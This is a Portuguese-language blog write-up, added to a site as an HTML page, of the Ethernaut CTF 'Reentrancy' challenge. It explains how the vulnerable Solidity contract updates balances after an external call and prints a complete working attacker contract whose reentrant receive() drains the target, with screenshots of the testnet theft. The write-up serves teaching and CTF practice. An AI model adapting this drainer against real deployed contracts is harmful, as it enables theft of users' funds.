@@ -1,0 +1,93 @@
+<!doctype html><html lang=en><head><title>Brazil0nChain</title>
+<meta charset=utf-8><meta content="utf-8" http-equiv=encoding><meta name=viewport content="width=device-width,initial-scale=1"><meta name=format-detection content="telephone=no"><meta name=theme-color content="#000084"><link rel=icon href=https://brazil0nchain.com//img/favicon.ico><link rel=canonical href=https://brazil0nchain.com/></head><body><nav class="navbar navbar-inverse navbar-fixed-top"><div class=navbar-inner><div class=container><button type=button class="btn btn-navbar" data-toggle=collapse data-target=.nav-collapse></button>
+<a class=brand href=https://brazil0nchain.com/>Brazil0nChain</a><div class="nav-collapse collapse"><ul class=nav><li><a href=/sobre/><span>Sobre</span></a></li><li><a href=/post/><span>Posts</span></a></li><li><a href=/writeups/><span>Writeups</span></a></li></ul></div></div></div></nav><link rel=alternate type=application/rss+xml href=https://brazil0nchain.com//index.xml title=Brazil0nChain><div id=content class=container><div class="row-fluid navmargin"><div class=page-header><h1>OpenZeppelin - Reentrancy - Feb 1, 2025</h1></div><p class=lead>Writeup - EtherNaut (OpenZeppelin) / Reentrancy.</br>Author: Pedro Silva (demon-i386)</p><p>Neste writeup, apresentamos a resolução do desafio <strong>“Reentrancy”</strong>, do <strong>CTF Ethernaut</strong> (OpenZeppelin), que descreve a exploração de um contrato inteligente vulnerável à falha de mesmo nome.
+A vulnerabilidade <strong>Reentrancy</strong> é classificada no <strong>OWASP TOP 10 2025</strong> como <strong>SC05:2025</strong> (<a href=https:/owasp.org/www-project-smart-contract-top-10/>OWASP Smart Contract Top 10</a>) e já foi explorada em diversos ataques notáveis, como:</p><ul><li><strong>The DAO Hack (2016)</strong></li><li><strong>Protocolo bZx (2020)</strong></li><li><strong>Lendf.me (2020)</strong></li><li><strong>Rari Capital (2022)</strong></li></ul><p>Dentre outros casos, esses ataques resultaram em prejuízos financeiros massivos para as empresas afetadas.</p><p><img src=../attachment/0b5e7dc7ebea1727718fdb4d07662179.png alt></p><p>O desafio começa com a seguinte proposta:</p><p><img src=../attachment/680f5ead4ca7a0f7a135ed3b7d45f52c.png alt></p><pre tabindex=0><code>O objetivo deste nível é que você roube todos os fundos do contrato.
+
+	Coisas que podem ajudar:
+
+- Contratos não confiáveis podem executar código onde você menos espera.
+- Métodos de fallback.
+- Propagação de throw/revert.
+- Às vezes, a melhor maneira de atacar um contrato é usando outro contrato.
+- Consulte a página &#34;?&#34; acima, seção &#34;Além do console&#34;.
+</code></pre><p>Junto ao código do contrato implementado:</p><p><img src=../attachment/5605e192f80bae1ffe0e9d8a5e85ec17.png alt></p><pre tabindex=0><code>/ SPDX-License-Identifier: MIT
+pragma solidity ^0.6.12;
+import &#34;openzeppelin-contracts-06/math/SafeMath.sol&#34;;
+
+contract Reentrance {
+    using SafeMath for uint256;
+    mapping(address =&gt; uint256) public balances;
+
+    function donate(address _to) public payable {
+        balances[_to] = balances[_to].add(msg.value);
+    }
+
+    function balanceOf(address _who) public view returns (uint256 balance) {
+        return balances[_who];
+    }
+
+    function withdraw(uint256 _amount) public {
+        if (balances[msg.sender] &gt;= _amount) {
+            (bool result,) = msg.sender.call{value: _amount}(&#34;&#34;);
+            if (result) {
+                _amount;
+            }
+            balances[msg.sender] -= _amount;
+        }
+    }
+    receive() external payable {}
+
+}
+</code></pre><p>Analisando o código, é possível identificar 3 (três) funções públicas:</p><ul><li><code>donate(address _to)</code>: É uma função <strong>payable</strong>, ou seja, permite que a função receba <strong>Ether</strong>. Recebe como argumento um endereço <code>_to</code> e adiciona ao saldo desse endereço no <strong>mapping</strong> <code>balances</code> o valor enviado no campo <code>msg.value</code> da transação.</li><li><code>balanceOf(address _who)</code>: Recebe como argumento um endereço através do campo <code>_who</code> e retorna seu saldo armazenado no <strong>mapping</strong> <code>balances</code>.</li><li><code>withdraw(uint256 _amount)</code>: Permite que um usuário saque uma quantidade <code>_amount</code> de <strong>Ether</strong>, desde que tenha saldo suficiente. O saque é realizado chamando <code>msg.sender.call{value: _amount}("");</code>, que envia o valor solicitado ao iniciador da transação (<code>msg.sender</code>), atualizando seu saldo ao final da transferência, conforme descrito no trecho: <code>balances[msg.sender] -= _amount;</code>.</li></ul><p>O objetivo do desafio é roubar todo o <strong>Ethereum</strong> armazenado no contrato, representando um total de 0.001 eth.</p><p><img src=../attachment/ff86fe209d0476bafd088cc40b01ab75.png alt></p><p>Observando as funções expostas pelo contrato, foram realizadas algumas considerações.</p><ul><li>A função <strong>withdraw</strong> requer que o valor do saque seja menor que o valor armazenado como saldo no endereço do usuário, armazenado no <strong>mapping</strong> <code>balances</code>. Trecho de código: (<code>if (balances[msg.sender] >= _amount) {</code>)</li><li>A subtração do saldo do usuário é realizada após a chamada ao método <code>call</code>.</li></ul><p>A vulnerabilidade no contrato surge quando ele realiza uma chamada externa sem antes atualizar seus valores internos, fato que leva a um problema de <strong>race condition</strong> (condição de corrida), onde um atacante consegue interferir na execução do contrato antes que trechos de código importantes sejam executados, no caso, antes que o valor de seu saque seja subtraído na lógica interna do contrato.</p><p>O ataque de <em>reentrancy</em>, ou reentrada (em brazuca), ocorre através da exploração dessa primitiva, onde um atacante força a execução uma funcionalidade especifica de um contrato externo de modo recorrente.</p><p>Para explicar a realização do ataque é necessário ter o entendimento de que existe uma função especial no Solidity chamada <code>receive</code>, chamada automaticamente sempre que um contrato recebe <strong>Ether</strong>.</p><h2 id=passo-a-passo-de-chamadas-realizadas-entre-contratos>Passo a passo de chamadas realizadas entre contratos</h2><p><strong>Contrato Vulnerável</strong>:<br>O contrato vulnerável realiza uma <strong>chamada externa</strong> (<code>call()</code>, no caso do contrato analisado) antes de atualizar o seu estado interno. A chamada é realizada para o contrato no controle do atacante.</p><p><strong>Primeira Chamada do Atacante</strong>:<br>O atacante, por meio de um contrato malicioso, deposita <strong>Ether</strong> no contrato vulnerável e chama a função de <strong>saque</strong> (<code>withdraw</code>). O contrato vulnerável <strong>verifica</strong> se há saldo suficiente e envia o Ether para o atacante.</p><ul><li>Importante: Até então, o saldo interno do contrato não foi atualizado, já que a função <code>call()</code> foi chamada em um contrato externo.</li><li>Segundo a documentação, a função <code>call()</code> passa o contexto de execução para o contrato alvo: &ldquo;<em>Calling a function on a different contract (instance) will perform an EVM function call and thus switch the context such that state variables in the calling contract are inaccessible</em>.&rdquo; - <a href=https://docs.soliditylang.org/en/latest/contracts.html>Soliditylang Docs</a></li></ul><p><strong>Execução da Função <code>receive()</code> do Atacante</strong>:<br>Quando o contrato vulnerável envia <strong>Ether</strong> ao atacante, <strong>a função <code>receive()</code></strong> do contrato malicioso é chamada automaticamente.<br>Dentro dessa função <code>receive()</code>, o atacante pode <strong>reentrar</strong> na função de saque (<code>withdraw</code>) do contrato vulnerável.</p><ul><li>Ao reentrar na função <code>withdraw</code>, sua execução é começa novamente, sendo novamente chamada a função <code>call()</code> com o contrato malicioso, ignorando novamente a etapa de subtração do saldo do usuário.</li></ul><p><strong>Reentrada na Função <code>withdraw</code></strong>:<br>O atacante, dentro da função <code>receive()</code>, chama <strong>novamente</strong> a função <code>withdraw()</code> do contrato vulnerável <strong>antes que o saldo interno</strong> do contrato seja atualizado. Como o saldo do atacante ainda não foi subtraído, ele consegue retirar mais <strong>Ether</strong> do contrato vulnerável.</p><p><strong>Execução Recursiva</strong>:<br>O processo de reentrância se repete: a cada chamada de <code>receive()</code> e reentrada em <code>withdraw()</code>, o atacante consegue <strong>sacar mais Ether</strong> do contrato vulnerável, sem que o contrato vulnerável consiga atualizar seu estado interno, visto que o <code>call()</code> transfere a execução ao contrato arbitrário.</p><p>A execução desse loop ocorre até que o gás acabe ou que todos os fundos do contrato sejam drenados.</p><p><img src=../attachment/4a18e8d9e57d38519568e8bfa6aca805.png alt></p><h2 id=exploit>Exploit!</h2><p>Para exploração da vulnerabilidade de reentrada, encontrada após a análise do contrato, é então criado um contrato malicioso conforme descrito abaixo.</p><p><img src=../attachment/0178a13de8653455b972f704064127cc.png alt></p><p>Funções criadas:</p><ul><li><code>exploitDonate()</code>: Realiza uma chamada ao método <code>donate</code> do contrato alvo, com uma transferência de um valor em <strong>Ether</strong>, necessário para cumprir o requisito do método <code>withdraw</code>.</li><li><code>exploitWithdraw()</code>: Realiza uma chamada ao método <code>withdraw</code> do contrato alvo, com uma transferência de um valor em <strong>Ether</strong>, que serve como argumento para indicar o valor que deve ser transferido para o contrato, e que não pode ser maior que o previamente depositado.</li><li><code>withdrawAll(address payable _to)</code>: Realiza o saque de todo o <strong>Ether</strong> armazenado no contrato malicioso para um endereço arbitrário, utilizado para sacar o <strong>Ether</strong> roubado para nossa carteira pessoa.</li><li><code>receive()</code>: Função especial, definimos em sua lógica uma chamada para a função <code>withdraw</code> do contrato vulnerável, reentrando na função após a transferência de contexto empregada pela função <code>call()</code>.</li></ul><pre tabindex=0><code>/ SPDX-License-Identifier: GPL-3.0
+
+pragma solidity &gt;=0.8.2 &lt;0.9.0;
+
+
+interface IExternalContract {
+    function donate(address _to) external payable;
+    function balanceOf(address _who) external view returns (uint256 balance);
+    function withdraw(uint256 _amount) external;
+}
+
+  
+contract Exploit {
+    IExternalContract private immutable targetContract;
+    constructor(address _targetContract) {
+        targetContract = IExternalContract(_targetContract);
+    }
+
+    function exploitDonate() public payable {
+        require(msg.value &gt; 0, &#34;Precisa enviar ETH&#34;);
+        targetContract.donate{value: msg.value}(address(this));
+    }
+
+  
+
+    / Função withdraw que requisita saque de valor especificado
+    function exploitWithdraw() public payable {
+        targetContract.withdraw(msg.value);
+    }
+
+  
+
+    / Função para sacar todo o saldo do contrato
+    function withdrawAll(address payable _to) public {
+        require(address(this).balance &gt; 0, &#34;Sem saldo para sacar&#34;);
+        _to.transfer(address(this).balance);
+    }
+
+  
+
+    / Recebe ETH e tenta realizar um saque do contrato externo
+    receive() external payable {
+	        if (address(targetContract).balance &gt;= msg.value) targetContract.withdraw(msg.value);
+    }
+
+}
+</code></pre><p>A imagem abaixo demonstra o contrato criado já na blockchain.</p><p><img src=../attachment/026a4e99ece2fc20f5a9c051a1f7a283.png alt></p><h4 id=1-função-exploitdonate>1. Função <code>exploitDonate()</code></h4><p>Enviando transação para depósito de 2 finney para contrato alvo.</p><p><img src=../attachment/3e3e1e492c88995fb22e8510c487b4e2.png alt></p><p>Valor total após deposito no contrato alvo:</p><p><img src=../attachment/319b8b62d377ed1edd3058717c0e0ab8.png alt></p><p>Registro da transação efetuada pelo contrato malicioso na blockchain após transferência de 0.002 finney.</p><p><img src=../attachment/052473cfb058735e3025efd15f551dd3.png alt></p><h4 id=2-função-exploitwithdraw---final>2. Função <code>exploitWithdraw()</code> - Final!</h4><p>É importante lembrar que a execução de chamadas entre contratos consome <strong>gás</strong>. Isso inclui tanto a execução de código dentro de um contrato quanto a transferência de dados entre contratos. Portanto, ao explorar uma falha como a de <strong>reentrância</strong>, onde chamadas recursivas são feitas dentro de um contrato, é importante garantir que haja <strong>gás suficiente</strong> alocado para cobrir a execução dessas chamadas.</p><p>Caso o <strong>gás</strong> alocado seja insuficiente para cobrir toda a execução de uma transação, o processo será <strong>revertido</strong>, o que significa que todas as mudanças feitas até aquele ponto serão desfeitas, e o estado do contrato será restaurado ao seu valor anterior. Isso pode impedir que o atacante tenha sucesso no ataque, caso ele não consiga consumir gás suficiente para completar as operações recursivas</p><p>O <strong>gás</strong> é uma unidade que mede o custo computacional necessário para executar uma operação na blockchain do <strong>Ethereum</strong>. Cada operação, como transferências ou execução de código de contratos tem um custo associado em termos de gás. Esse custo é determinado pela complexidade da operação e pela quantidade de dados que ela manipula. Ele é como se fosse um imposto empregado pela rede para impedir, por exemplo, execução infinita de funções.</p><p>&ldquo;intenção do sistema de taxas é exigir que um invasor pague proporcionalmente por cada recurso que consome, incluindo computação, largura de banda e armazenamento, portanto, qualquer transação que leve a rede a consumir uma quantidade maior de qualquer um desses recursos deve ter uma taxa de gás mais ou menos proporcional ao aumento.&rdquo;</p><p>Executando método <code>ExploitWithdraw()</code>, parte final para execução do ataque de <em>reentrancy</em>, visto que após essa chamada, todas as subsequentes irão ser executadas diretamente na função <code>receive()</code>.</p><p><img src=../attachment/603a9b68398d83237b8415d9e670cfc4.png alt></p><h4 id=aftermath>Aftermath</h4><p>Após a execução do método <code>exploitWithdraw()</code>, foi criado um loop dentro de ambos os contratos malicioso e alvo, onde o contrato malicioso, abusando da ausência de atualização de seu saldo pelo contrato real, forçou a execução da função de saque do contrato alvo até o fim de suas reservas de <strong>Ether</strong>.</p><p>Sempre que o contrato alvo realizava uma transferência de <strong>Ether</strong> por meio do método <code>call()</code>, o <strong>contexto de execução</strong> (e o <strong>Ether</strong> sacado) era transferido para o contrato malicioso. Isso fazia com que o contrato malicioso <strong>reentrasse</strong> na função de saque do contrato alvo <strong>antes que o saldo interno fosse atualizado</strong>, impedindo que o contrato alvo registrasse a subtração do valor sacado.</p><p>Essa falha permitiu que o contrato malicioso executasse a função de saque de forma <strong>recursiva</strong> até que o saldo do contrato alvo fosse totalmente drenado.</p><p><img src=../attachment/d86a395e3da225108e0334086fe4509d.png alt></p><p>É possível observar o histórico de transações internas realizadas pelo contrato, com inúmeras transferências realizadas do contrato alvo para o malicioso.
+(em vermelho, transações recebidas pelo contrato alvo)</p><p><img src=../attachment/5ea6814af784252b6f8abeb35692ca99.png alt></p><h4 id=profit>Profit!</h4><p>Com o contrato malicioso em posse das reservas de <strong>Ether</strong> do contrato alvo, é possível realizar o saque de sua reserva interna para nossa carteira pessoal.</p><p><img src=../attachment/e84f8d85710a58eb4467f9aee2ff2def.png alt></p><p>Estado da Carteira antes da realização do saque:</p><p><img src=../attachment/cbe18827d7ea464654de6447115abb5a.png alt></p><p>Estado da Carteira depois da realização do saque:</p><p><img src=../attachment/4240605e3681136e0fd441ee5c991d40.png alt></p><h4 id=fin>FIN!</h4><h4><a href=https://brazil0nchain.com/>Back to Home</a></h4></div></div><footer class=container><hr class=soften><p>RSS Feed habilitado! |
+&copy;
+demon-i386 / h4rry1337 |
+<span id=thisyear>2025</span></p><script src=https://public.bnbstatic.com/unpkg/growth-widget/cryptoCurrencyWidget@0.0.19.min.js></script><div class=binance-widget-marquee data-cmc-ids=1,1027,52,5426,74,1958,11419,24478,5690,13502 data-theme=dark data-transparent=false data-locale=en data-fiat=USD></div></br><p style=word-wrap:break-word;overflow-wrap:break-word;white-space:normal>Bitcoin: bc1qzumgrjv2jjnxphny56246kjc9qur3uj5x95kzr<br>Monero: 4B7QhZcqMCMGCy7Fe9ifEjKCTXLs6UUpa9UAgQPDdenBMCk3oNKpSh313GTqKphu5uX5wgpyHAQ1kXEyH7ma7N9N8EKFxcV<br>Solana: wc94DzEAtsKofkx4EDjNwU3tvkHvPnGJAXgNJVpUtSK<br></p><p class=text-center><a href=https://t.me/+7XwHY3E3FDAyZjMx>Telegram</a> |
+<a href=https://x.com/brazil0nchain>Twitter</a> |
+<a href=https://discord.gg/fDGRFKFwcJ>Discord</a></p><script>const targetClass="binance-widget__footer",observer=new MutationObserver(()=>{const e=document.querySelector(`.${targetClass}`);e&&(console.log("Elemento encontrado! Removendo..."),e.remove(),observer.disconnect())});observer.observe(document.body,{childList:!0,subtree:!0})</script></footer></body><link rel=stylesheet href=/css/bootstrap.css><link rel=stylesheet href=/css/bootstrap-responsive.css><link rel=stylesheet href=/css/style.css><script src=/js/jquery.js></script><script src=/js/bootstrap-386.js></script><script src=/js/bootstrap-transition.js></script><script src=/js/bootstrap-alert.js></script><script src=/js/bootstrap-modal.js></script><script src=/js/bootstrap-dropdown.js></script><script src=/js/bootstrap-scrollspy.js></script><script src=/js/bootstrap-tab.js></script><script src=/js/bootstrap-tooltip.js></script><script src=/js/bootstrap-popover.js></script><script src=/js/bootstrap-button.js></script><script src=/js/bootstrap-collapse.js></script><script src=/js/bootstrap-carousel.js></script><script src=/js/bootstrap-typeahead.js></script><script src=/js/bootstrap-affix.js></script><script>_386={fastLoad:!1,onePass:!1,speedFactor:2.5};function ThisYear(){document.getElementById("thisyear").innerHTML=(new Date).getFullYear()}</script></html>
